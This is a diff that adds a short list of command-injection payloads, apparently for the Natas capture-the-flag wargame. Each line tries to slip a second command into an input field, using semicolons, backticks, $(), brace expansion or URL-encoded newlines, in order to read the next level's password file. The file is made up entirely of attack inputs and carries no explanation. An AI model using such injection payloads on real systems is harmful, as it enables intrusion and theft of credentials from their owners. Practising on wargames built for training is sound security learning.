@@ -1,0 +1,18 @@
+0 dictionary.txt;cat /etc/natas_webpass/natas11
+
+0 dictionary.txt;`cat /etc/natas_webpass/natas11`
+
+0 dictionary.txt $(cat /etc/natas_webpass/natas11)
+
+0 dictionary.txt cat</etc/natas_webpass/natas11
+
+0 dictionary.txt${cat,/etc/natas_webpass/natas11}
+
+0 dictionary.txt%0Acat%20/etc/natas_webpass/natas11
+
+
+0 dictionary.txt%0acat /etc/natas_webpass/natas11
+
+
+
+
